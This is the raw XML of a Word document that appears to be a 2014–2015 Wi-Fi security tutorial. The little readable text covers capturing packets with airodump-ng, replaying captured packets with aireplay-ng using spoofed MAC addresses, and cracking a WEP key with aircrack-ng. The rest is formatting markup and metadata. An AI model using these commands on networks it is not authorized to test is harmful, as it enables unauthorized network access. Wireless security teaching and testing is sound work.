          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w capture wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B6F4FF" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="004233BD" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53E1936E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">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you</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> can start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> and attempt to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE1D707" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6602E8E1" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00970925"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aircrack</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-b 00:14:6C:7E:40:80 capture*.cap </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18ACE891" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C62BA93"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Another variation of this attack is to use packets from a previous capture. You must have captured the full packets, not just the IVs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329C6036"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Here is what the command would look like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3423C40C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B24BE53" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00970925"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aireplay</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-2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -r capture-01.cap wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA6584F" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2796A69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 ” -r capture-01.cap” is data from a previous capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5981CB2A" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="635C0211" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="007A2212" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="661F45B2" w14:textId="77777777" w:rsidR="00561527" w:rsidRPr="00F534DD" w:rsidRDefault="00561527" w:rsidP="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00561527" w:rsidRPr="00F534DD" w:rsidSect="00F343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 w:name="Consolas">
    <w:panose1 w:val="020B0609020204030204"/>
    <w:charset w:val="00"/>
    <w:family w:val="auto"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="A00002EF" w:usb1="40002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48342FD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="39C4894A"/>
    <w:lvl w:ilvl="0" w:tplc="524A41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3072966"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AD66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0666E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="280A68C6"/>
    <w:lvl w:ilvl="0" w:tplc="F61E8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0"/>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47"/>
    <w:rsid w:val="00002BA9"/>
    <w:rsid w:val="000147FF"/>
    <w:rsid w:val="00025A34"/>
    <w:rsid w:val="00037A0F"/>
    <w:rsid w:val="00056E54"/>
    <w:rsid w:val="00062401"/>
    <w:rsid w:val="00062BA3"/>
    <w:rsid w:val="00071C0E"/>
    <w:rsid w:val="000C69E8"/>
    <w:rsid w:val="000E0B50"/>
    <w:rsid w:val="000E1B52"/>
    <w:rsid w:val="000F33A6"/>
    <w:rsid w:val="0012418B"/>
    <w:rsid w:val="001839A4"/>
    <w:rsid w:val="0025290C"/>
    <w:rsid w:val="0027750B"/>
    <w:rsid w:val="002B0795"/>
    <w:rsid w:val="00307E5D"/>
    <w:rsid w:val="003722F8"/>
    <w:rsid w:val="003773EA"/>
    <w:rsid w:val="003975DE"/>
    <w:rsid w:val="003B1BBD"/>
    <w:rsid w:val="003C5340"/>
    <w:rsid w:val="003D0165"/>
    <w:rsid w:val="003D7852"/>
    <w:rsid w:val="0046722B"/>
    <w:rsid w:val="00470AE6"/>
    <w:rsid w:val="00477221"/>
    <w:rsid w:val="00480CC6"/>
    <w:rsid w:val="004B27DE"/>
    <w:rsid w:val="004B4794"/>
    <w:rsid w:val="004B7829"/>
    <w:rsid w:val="004C6465"/>
    <w:rsid w:val="00515BA7"/>
    <w:rsid w:val="0053024B"/>
    <w:rsid w:val="005408E2"/>
    <w:rsid w:val="00557B81"/>
    <w:rsid w:val="00561527"/>
    <w:rsid w:val="00585754"/>
    <w:rsid w:val="00657403"/>
    <w:rsid w:val="006A34C8"/>
    <w:rsid w:val="006C69A7"/>
    <w:rsid w:val="007020BE"/>
    <w:rsid w:val="0071739C"/>
    <w:rsid w:val="00753B04"/>
    <w:rsid w:val="00775D5B"/>
    <w:rsid w:val="00781C97"/>
    <w:rsid w:val="00786CA2"/>
    <w:rsid w:val="007B0476"/>
    <w:rsid w:val="00803B63"/>
    <w:rsid w:val="00807AA6"/>
    <w:rsid w:val="00812CFB"/>
    <w:rsid w:val="008919ED"/>
    <w:rsid w:val="008A0D96"/>
    <w:rsid w:val="008C666C"/>
    <w:rsid w:val="008D1A6B"/>
    <w:rsid w:val="00A14927"/>
    <w:rsid w:val="00A2052A"/>
    <w:rsid w:val="00A74219"/>
    <w:rsid w:val="00A86EAD"/>
    <w:rsid w:val="00AB32B9"/>
    <w:rsid w:val="00AE04E9"/>
    <w:rsid w:val="00B20A28"/>
    <w:rsid w:val="00B20DC5"/>
    <w:rsid w:val="00B223EB"/>
    <w:rsid w:val="00B6342E"/>
    <w:rsid w:val="00B64689"/>
    <w:rsid w:val="00BB71AD"/>
    <w:rsid w:val="00C00747"/>
    <w:rsid w:val="00C14F90"/>
    <w:rsid w:val="00C16128"/>
    <w:rsid w:val="00C20E68"/>
    <w:rsid w:val="00C3132B"/>
    <w:rsid w:val="00C31B4E"/>
    <w:rsid w:val="00C70BD1"/>
    <w:rsid w:val="00C72A0D"/>
    <w:rsid w:val="00C92AD8"/>
    <w:rsid w:val="00C94D2E"/>
    <w:rsid w:val="00CE1D3A"/>
    <w:rsid w:val="00CE6B29"/>
    <w:rsid w:val="00D2207B"/>
    <w:rsid w:val="00DA42AC"/>
    <w:rsid w:val="00E0380B"/>
    <w:rsid w:val="00E04247"/>
    <w:rsid w:val="00E21BA5"/>
    <w:rsid w:val="00E71FE9"/>
    <w:rsid w:val="00EB10B7"/>
    <w:rsid w:val="00EB60F0"/>
    <w:rsid w:val="00F34354"/>
    <w:rsid w:val="00F36867"/>
    <w:rsid w:val="00F477A7"/>
    <w:rsid w:val="00F534DD"/>
    <w:rsid w:val="00F573A9"/>
    <w:rsid w:val="00F7392B"/>
    <w:rsid w:val="00FB3D55"/>
    <w:rsid w:val="00FE3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B406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47"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003D0165"/>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D1A6B"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003722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2F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47"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003D0165"/>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D1A6B"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003722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2F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26246">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="484780960">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="336929468">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1189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920">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="566720828">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1780951501">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="15563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31471">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="2103185224">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1076242725">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1599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yperlink" Target="http://www.aircrack-ng.org/doku.php?id=i_am_injecting_but_the_ivs_don_t_increase&amp;DokuWiki=6a98f589ec171d976ab1600c6641c9a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rcrack-ng.org/doku.php?id=i_am_injecting_but_the_ivs_don_t_increase&amp;DokuWiki=6a98f589ec171d976ab1600c6641c9a4" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cloudcracker.com" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.wireshark.org/docs/dfref/w/wlan.html" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.wireshark.org/docs/dfref/w/wlan_mgt.html" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.wireshark.org/docs/dfref/w/wlan_aggreg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29</Pages>
  <Words>5290</Words>
  <Characters>30157</Characters>
  <Application>Microsoft Macintosh Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>251</Lines>
  <Paragraphs>70</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>35377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31</cp:revision>
  <cp:lastPrinted>2014-12-08T21:55:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2014-11-16T12:30:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2015-01-20T10:11:00Z</dcterms:modified>
</cp:coreProperties>
</file>